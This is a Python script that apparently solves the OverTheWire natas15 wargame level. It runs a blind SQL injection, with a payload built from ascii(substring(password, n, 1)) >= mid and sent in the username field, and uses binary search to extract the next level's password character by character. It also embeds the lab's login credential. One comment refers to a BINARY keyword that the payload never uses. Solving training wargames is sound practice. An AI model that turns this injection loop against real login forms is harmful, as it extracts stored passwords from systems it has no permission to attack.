import requests
from requests.auth import HTTPBasicAuth

url = 'http://natas15.natas.labs.overthewire.org/'
auth = HTTPBasicAuth('natas15', 'GB6USCJYJjwLyYhZUNkE1NwDueiTow6g')

password = ""
print("[*] Detecting password for natas16 using binary search...")

# Password length is usually 32 characters
for position in range(1, 33):
    # Printable ASCII range (from 32 to 126)
    low = 32
    high = 126
    
    while low <= high:
        mid = (low + high) // 2
        
        # Using SUBSTRING and ASCII functions for precise character matching
        # BINARY keyword ensures case-sensitivity
        payload = f'natas16" and ascii(substring(password, {position}, 1)) >= {mid}-- '
        
        try:
            response = requests.post(url, auth=auth, data={'username': payload})
            
            if "This user exists." in response.text:
                # If True, the character is in the upper half range
                low = mid + 1
            else:
                # If False, the character is in the lower half range
                high = mid - 1
        except requests.RequestException as e:
            print(f"\n[!] Network error occurred: {e}")
            continue

    # When low > high, the value of high is the correct ASCII code
    if high >= 32:
        password += chr(high)
        print(f"[+] Found char at position {position}: {chr(high)} -> Current: {password}")
    else:
        print(f"\n[!] Failed to detect char at position {position}. Might be the end.")
        break

print(f"\n[!] Success! The password for natas16 is: {password}")
